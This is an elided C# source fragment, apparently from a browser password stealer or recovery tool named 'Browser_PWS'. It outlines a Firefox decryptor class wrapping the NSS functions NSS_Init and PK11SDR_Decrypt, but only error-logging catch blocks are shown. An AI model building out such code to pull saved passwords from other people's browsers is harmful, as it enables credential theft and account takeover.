...
namespace Browser_PWS
{
    ...
    static class FFDecryptor
    {
        ...
        public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            ...
            {
                GetBrowserPw.ErrorLog(ex.Message, "FFDecryptor/V:PK11SDR_Decrypt");
                return 0;
            }
        }
        ...
        public static long NSS_Init(string configdir, string mozillaPath)
        {
            try
            {
                ...
                {
                    GetBrowserPw.ErrorLog("Firefox does not match with app version (32 bit and 64 bit)!\nMESSAGE: " + ex.Message, "FFDecryptor/V:NSS_Init/T:VersionsNotMatch");
                    return 0;
                }
            }
            catch (Exception ex)
            {
                GetBrowserPw.ErrorLog(ex.Message, "FFDecryptor/V:NSS_Init");
                return 0;
            }
        }
        ...
        public static string Decrypt(string cypherText)
        {
            ...
            {
                GetBrowserPw.ErrorLog(ex.Message, "FFDecryptor/V:Decrypt");
                return "Error while decrypting :(";
            }
            finally
            {
